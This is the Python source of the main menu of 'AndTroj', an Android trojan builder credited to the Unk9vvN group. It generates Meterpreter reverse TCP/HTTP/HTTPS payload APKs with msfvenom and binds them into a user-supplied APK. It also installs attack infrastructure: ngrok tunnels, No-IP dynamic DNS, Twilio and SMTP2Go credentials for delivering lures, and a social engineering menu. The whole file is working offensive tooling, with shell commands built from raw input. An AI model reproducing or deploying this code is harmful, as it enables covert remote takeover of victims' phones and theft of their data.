#!/usr/bin/env python
# coding=utf-8
# https://t.me/unk9vvn
# AVI
import os, sys, urllib2, time, subprocess, random
from core.start import LAN, WAN, USER, rename, cls
from core.binder import binder
from core.eng_menu import eng_menu



def main_menu():
    tmp = '/usr/share/AndTroj/tmp/'
    cls()
    clear = '\x1b[0m'
    colors = [36, 32, 34, 35, 31, 37]
    x = """
                              `-/osssssssssssso/-`                    
                          -+sss+-+-`os.yo:++/.o-/sss+-                
                       /sy+++`.h. d`d++m+om/s.h.hy/:+oys/             
                    .sy/// h/h`:d-y:/+-/+-+/-s/sodooh:///ys.          
                  -ys-ss/:y:so-/osssso++++osssso+.oo+/s`:o.sy-        
                `ys:oossyo/+oyo/:`:.-:.:/.:/-.-:/syo/+/s+:oo:sy`      
               /d/:-soh/-+ho-.:::``:- .os: -:`.:`/::sy+:+ysso+:d/     
              sy-..+oo-+h:`-:..hy+y/  :s+.  /y/sh..:/`:h+-oyss:.ys    
             ys :+oo/:d/   .m-yyyo/- ` -:   .+oyhy-N.   /d::yosd.sy   
            oy.++++//d.  ::oNdyo:     .--.     :oyhN+-:  .d//s//y.ys  
           :m-y+++//d`   dyyy++::`. -.o.`+.- .`::/+hsyd   `d/so+++.m: 
          `d/`/+++.m`  /.ohso` ://:///++++///://:  :odo.+  `m.syoo:/d`
          :m`+++y:y+   smyms`   -//+/`ohho`/+//-    omsmo   +y s+oy-m:
          sy:+++y`N`  -.dy+:...-- :: ./hh/. :: --...//hh.:  `N`o+/:-so
          yo-///s-m   odohd.-.--:/o.`+/::/+`.o/:--.--hd:ho   m-s+++-+y
          yo::/+o-m   `yNy/:  ...:+s.//:://.s+:...  :/yNs    m-h++++oy
          oy/hsss`N`  oo:oN-   .-o.:ss:--:ss:.o-.   -My-oo  `N`o+++.so
          :m :++y:y+   sNMy+: `+/:.--:////:--.:/+` -+hNNs   +y-o++o`m:
          `d/::+o+.m`  -:/+ho:.       -//-       ./sdo::-  `m-o++++/d`
           :m-yo++//d` `ommMo//        -:        +oyNhmo` `d//s+++`m: 
            oy /o++//d.  `::/oMss`   `+++s     :yNy+/:   .d//y+--`ys  
             ys-`+o++:d/ `/sdmNysNs+/./-//-//hNyyNmmy+- /d-+y-`::sy   
              sy:..ooo-+h/--.-//odm/hNh--yNh+Ndo//-./:/h+-so+:+/ys    
               /d-o.ssy+-+yo:/:/:-:+sho..ohs/-:://::oh+.h//syo-d/     
                `ys-oosyss:/oyy//::..`.-`.-`:/.//syo+-ys//o/.sy`      
                  -ys.sooh+d-s:+osssysssosssssso:/+/h:/yy/.sy-        
                    .sy/:os.h-`d/o+-/+:o:/+.+o:d-y+h-o+`+ys.          
                       :sy+:+ s//sy-y.`h`m/om:s-y.++/+ys/             
                          -+sss+/o/ s-`y.s+/:++-+sss+-                
                              `-/osssssssssssso/-`                    
                                    Unk9vvN
                              https://t.me/Unk9vvN
                                    AndTroj
"""
    for N, line in enumerate(x.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
        time.sleep(0.01)

    try:
        print '\t[i] USER: {0}'.format(USER())
        print '\t[i]  LAN: {0}'.format(LAN())
        print '\t[i]  WAN: {0}'.format(WAN())
        print '\t[i]  USE CMD: atj'
    except urllib2.URLError:
        print '\t[i] USER: {0}'.format(USER())
        print '\t[i]  LAN: {0}'.format(LAN())
        print '\t[i]  WAN: Disconnected'
        print '\t[i]  USE CMD: atj'

    payload = raw_input("\n\t[1] android/meterpreter/reverse_tcp\n\t"
                        "[2] android/meterpreter/reverse_http\n\t"
                        "[3] android/meterpreter/reverse_https\n\t"
                        "[4] Install Ngrok-Twilio-BeEF-NoIP\n\t"
                        "[5] Social Engineering Menu\n\t"
                        "[0] EXIT\n\t"
                        "\n\nroot@unk9vvn:~# ")
    if payload == "1":
        check_ngrok = os.path.exists('/root/.ngrok2/ngrok.yml')
        if check_ngrok == (True):
            APK = raw_input("\t[?] APK: ")
            LHOST = raw_input("\t[?] LHOST: ")
            LPORT = raw_input("\t[?] LPORT: ")
            print "\n"
            subprocess.call(
                'msfvenom --platform android -a dalvik -p android/meterpreter/reverse_tcp LHOST=' + LHOST + ' LPORT=' + LPORT + ' -o ' + tmp + 'payload.apk',
                shell=True)
            subprocess.call(
                'echo "reverse_tcp" > ' + tmp + 'protocol.txt',
                shell=True)
            rename(APK)
            binder()
            print "\n"
        else:
            print "\n\t[X] Please selected 4 menu for install Ngrok..."
            main_menu()

    elif payload == "2":
        check_ngrok = os.path.exists('/root/.ngrok2/ngrok.yml')
        if check_ngrok == (True):
            APK = raw_input("\t[?] APK: ")
            LHOST = raw_input("\t[?] LHOST: ")
            LPORT = raw_input("\t[?] LPORT: ")
            print "\n"
            subprocess.call(
                'msfvenom --platform android -a dalvik -p android/meterpreter/reverse_http LHOST=' + LHOST + ' LPORT=' + LPORT + ' -o ' + tmp + 'payload.apk',
                shell=True)
            subprocess.call(
                'echo "reverse_http" > ' + tmp + 'protocol.txt',
                shell=True)
            rename(APK)
            binder()
            print "\n"
        else:
            print "\n\t[X] Please selected 4 menu for install Ngrok..."
            main_menu()

    elif payload == "3":
        check_ngrok = os.path.exists('/root/.ngrok2/ngrok.yml')
        if check_ngrok == (True):
            APK = raw_input("\t[?] APK: ")
            LHOST = raw_input("\t[?] LHOST: ")
            LPORT = raw_input("\t[?] LPORT: ")
            print "\n"
            subprocess.call(
                'msfvenom --platform android -a dalvik -p android/meterpreter/reverse_https LHOST=' + LHOST + ' LPORT=' + LPORT + ' -o ' + tmp + 'payload.apk',
                shell=True)
            subprocess.call(
                'echo "reverse_https" > ' + tmp + 'protocol.txt',
                shell=True)
            rename(APK)
            binder()
            print "\n"
        else:
            print "\n\t[X] Please selected 4 menu for install Ngrok..."
            main_menu()

    elif payload == "4":
        check_ngrok = os.path.exists('/root/.ngrok2/ngrok.yml')
        if check_ngrok == (False):
            check_AndTroj = os.path.exists('~/.AndTroj')
            if check_AndTroj == (False):
                subprocess.call(
                    'mkdir /root/.AndTroj',
                    shell=True)
            else:
                pass
            Ngrok_Token = raw_input("\n\t[i] Visit & Register > https://dashboard.ngrok.com/user/signup"
                                    "\n\t[?] Ngrok Token: ")
            
            Twilio_Token = raw_input("\n\n\t[i] Visit & Register > https://www.twilio.com/try-twilio"
                                     "\n\t[?] Twilio Token: ")
            Twilio_SID = raw_input("\n\t[?] Twilio SID: ")
            
            Smtp2Go_USER = raw_input("\n\n\t Visit & Register > https://www.smtp2go.com/pricing"
                                     "\n\t[?] Smtp2Go USER: ")
            Smtp2Go_PASS = raw_input("\n\t[?] Smtp2Go PASS: ")
            check_Smtp2Go = os.path.exists('~/.AndTroj/Smtp2Go_auth.txt')
            if check_Smtp2Go == (False):
                subprocess.call(
                    'echo "' + Smtp2Go_USER + '" > /root/.AndTroj/Smtp2Go_auth.txt;echo "' + Smtp2Go_PASS + '" >> /root/.AndTroj/Smtp2Go_auth.txt',
                    shell=True)
            else:
                print "I: Smtp2Go Token installed..."
                pass
            check_twilio = os.path.exists('~/.AndTroj/Twilio_Token.txt')
            if check_twilio == (False):
                subprocess.call(
                    'echo "' + Twilio_Token + '" > /root/.AndTroj/Twilio_Token.txt;echo "' + Twilio_SID + '" > /root/.AndTroj/twilio_sid.txt',
                    shell=True)
            else:
                print "I: Smtp2Go Token installed..."
                pass
            check_GeoLiteCity = os.path.exists('/opt/GeoIP/GeoLiteCity.dat')
            if check_GeoLiteCity == (False):
                subprocess.call(
                    'curl -O http://geolite.maxmind.com/download/geoip/database/GeoLiteCity.dat.gz',
                    shell=True)
                subprocess.call(
                    'gunzip GeoLiteCity.dat.gz && mkdir /opt/GeoIP && mv GeoLiteCity.dat /opt/GeoIP',
                    shell=True)
            else:
                print "I: GeoLiteCity extensions installed..."
                pass
            execute = '#!/bin/bash\n/usr/share/ngrok/ngrok "$@"'
            commandl = open('/usr/bin/ngrok', 'w')
            commandl.write(execute)
            commandl.close()
            check_ngrok = os.path.exists('/usr/share/ngrok')
            if check_ngrok == (False):
                subprocess.call(
                    'mkdir /usr/share/ngrok && chmod +x /usr/share/ngrok;chmod +x /usr/bin/ngrok;'
                    'cd /usr/share/ngrok;wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip;'
                    'unzip ngrok-stable-linux-amd64.zip;rm ngrok-stable-linux-amd64.zip;./ngrok authtoken ' + Ngrok_Token + '',
                    shell=True)
            else:
                print "I: Ngrok Token installed..."
                pass
            check_noip = os.path.exists('/usr/share/noip-2.1.9-1')
            if check_noip == (False):
                print "\n\t[i] Visit & Register > https://www.noip.com/sign-up\n\t[i] Login & Create Host > " \
                      "https://www.noip.com/login\n "
                subprocess.call(
                    'cd /usr/share/ && wget https://www.noip.com/client/linux/noip-duc-linux.tar.gz;tar xzf '
                    'noip-duc-linux.tar.gz;rm noip-duc-linux.tar.gz;cd noip-2.1.9-1;make && make install',
                    shell=True)
                print(os.system('noip2'))
                main_menu()
            else:
                print(os.system('noip2'))
                main_menu()
            print "\n\t[i] Install Completed..."
            main_menu()
        else:
            print "\n\t[i] Install Completed..."
            main_menu()
    elif payload == "5":
        eng_menu()
    elif payload == "0":
        sys.exit()
    else:
        main_menu()
